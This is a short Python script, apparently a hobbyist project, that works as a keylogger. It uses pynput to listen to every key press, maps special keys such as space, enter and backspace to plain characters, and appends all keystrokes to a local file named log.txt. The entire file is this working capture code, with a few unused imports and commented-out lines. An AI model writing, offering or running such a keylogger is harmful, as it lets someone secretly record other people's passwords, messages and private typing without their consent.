
from curses.ascii import isupper
from http.cookiejar import uppercase_escaped_char

from pynput.keyboard import Listener



def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    # print(letter)
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.shift_r':
        # if letter.isupper():
        #     letter = letter.lower()
        # else:
        #     letter = letter.upper()
        letter = ''
    if letter == 'Key.shift_l':
        # if letter.isupper():
        #     letter = letter.lower()
        # else:
        #     letter = letter.upper()
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == 'Key.backspace':
        letter = ' '
    if letter == 'Key.delete':
        letter = ' '
    if letter == 'Key.shift':
        letter = ' '
    if letter == 'Key.ctrl':
        letter = ' '
    if letter == 'Key.alt':
        letter = ' '
    if letter == 'Key.backspace':
        letter = ' '
    with open("log.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()
